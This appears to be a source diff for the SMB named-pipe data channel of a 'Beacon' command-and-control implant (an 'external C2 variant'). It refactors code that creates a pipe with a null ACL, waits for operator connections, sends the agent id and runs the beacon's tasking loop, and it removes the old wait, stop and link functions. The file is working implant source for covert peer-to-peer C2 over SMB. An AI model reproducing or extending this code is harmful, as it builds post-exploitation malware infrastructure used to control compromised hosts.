@@ -1,14 +1,19 @@
 /*
- * Manage the SMB data channel for Beacon
+ * Manage the SMB data channel for Beacon (external C2 variant)
  * Entry point:
  *	1. command_link_wait
  *		user requested SMB data channel
- *	2. smb_init 
+ *	2. smb_init
  *		create our named pipe with a null ACL
  *	3. smb_wait
  *		wait for a connection... send agent id when it comes
  *	4. smb_process
  *		process server data please... do normal beacon stuff.
+ * The shared channel body (smb_wait/smb_stop/command_link_wait) lives in
+ * client_smb_common.h; this file only carries the extc2-specific pieces:
+ * the message-mode read/write channel functions the controller contract
+ * requires (4B header and payload written as SEPARATE messages - see
+ * docs/MATRIX.md section 6.3).
  */
 
 #include "beacon.h"
@@ -20,12 +25,7 @@
 #include "clientint.h"
 #include "jobs.h"
 
-extern unsigned int post_type;
-extern unsigned int sleep_time;
-static HANDLE       pipe;
-
-BOOL GarglePipeWait(HANDLE pipe);
-void GargleBlockPipe(HANDLE pipe);
+#include "client_smb_common.h"
 
 int link_channel_smb_extc2_read(void * thisp, char * buffer, int max) {
 	LCHANNEL * inst = (LCHANNEL *)thisp;
@@ -45,8 +45,6 @@ int link_channel_smb_extc2_read(void * thisp, char * buffer, int max) {
 
 int link_channel_smb_extc2_write(void * thisp, char * buffer, int length) {
 	LCHANNEL * inst = (LCHANNEL *)thisp;
-	char     * frame;
-	int        flen;
 
 	/* restore old behavior of writing a single byte as our heartbeat, instead of pushing empty frames */
 	if (length == 0) {
@@ -62,12 +60,6 @@ int link_channel_smb_extc2_write(void * thisp, char * buffer, int length) {
 	return write_all(inst->pipe, buffer, length);
 }
 
-/* call our gargle function */
-static void link_channel_smb_wait(void * thisp) {
-	LCHANNEL * inst = (LCHANNEL *)thisp;
-	GargleBlockPipe(inst->pipe);
-}
-
 /* create a new kind of channel */
 LCHANNEL lchannel_smb_gargle(HANDLE pipe) {
 	LCHANNEL channel;
@@ -76,26 +68,6 @@ LCHANNEL lchannel_smb_gargle(HANDLE pipe) {
 	channel.read  = link_channel_smb_extc2_read;
 	channel.write = link_channel_smb_extc2_write;
 	return channel;
-}
-
-/*
-* wait for a connection to our named pipe
-*/
-void smb_wait() {
-	if (GarglePipeWait(pipe)) {
-		/* we have a connection, yay */
-	}
-	else {											/* plan B */
-		DWORD fConnected = 0;
-
-		/* wait for a connection to our pipe */
-		while (!fConnected) {
-			fConnected = ConnectNamedPipe(pipe, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);
-		}
-	}
-
-	/* OK, kick off our client init routine. */
-	client_init(lchannel_smb_gargle(pipe));
 }
 
 /*
@@ -119,42 +91,4 @@ BOOL smb_init() {
 	/* now we can assign the handle */
 	pipe = temps;
 	return TRUE;
-}
-
-/* stop everything */
-void smb_stop() {
-	/* OK, shut everything down! */
-	CloseHandle(pipe);
-
-	/* clean up the resources with our last go */
-	client_stop();
-}
-
-/*
-* put this beacon into a mode where it's waiting for a connection to its pipe
-*/
-void command_link_wait() {
-	/* setup our SMB server */
-	if (!smb_init()) {
-		return;
-	}
-
-	/* while we are an SMB server... do this stuff */
-	while (sleep_time > 0) {
-		/* wait for a connection and send our agent id */
-		smb_wait();
-
-		/* process data */
-		client_process();
-
-		/* close the session */
-		FlushFileBuffers(pipe);
-		DisconnectNamedPipe(pipe);
-	}
-
-	/* we're no longer an SMB server... stop the shenanigans */
-	smb_stop();
-
-	/* just kill the process... it's this or crash */
-	safe_exit();
 }
